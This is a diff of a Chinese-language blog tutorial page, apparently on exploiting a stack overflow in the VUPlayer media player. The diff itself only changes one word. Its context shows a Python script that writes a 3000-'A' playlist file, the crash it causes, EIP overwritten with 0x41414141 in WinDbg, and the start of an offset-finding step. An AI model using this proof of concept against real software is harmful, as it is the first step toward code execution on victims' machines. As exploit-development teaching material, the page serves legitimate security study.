@@ -649,7 +649,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="number">3000</span> * <span class="string">&quot;A&quot;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;test.m3u&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">file.write(payload)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
 
 <p>打开VUPlayer，选择<code>file--&gt;open playlist</code>，选中<code>test.m3u</code>，发现<code>VUPlayer</code>闪退。</p>
-<p>使用windbg打开，将<code>test.m3u</code>拖入<code>VUPlayer</code>，发现 EIP 被 0x41414141 覆盖，确认存在栈溢出漏洞</p>
+<p>使用windbg打开，将<code>test.m3u</code>拖入<code>VUPlayer</code>，发现 EIP 被 0x41414141 覆盖，确定存在栈溢出漏洞</p>
 <p><img src="/../pic/Exploitme2/EIP41414141.png" alt="EIP41414141"></p>
 <h3 id="确认偏移量"><a href="#确认偏移量" class="headerlink" title="确认偏移量"></a>确认偏移量</h3><p>在windbg中输入以下命令</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.load pykd</span><br></pre></td></tr></table></figure>
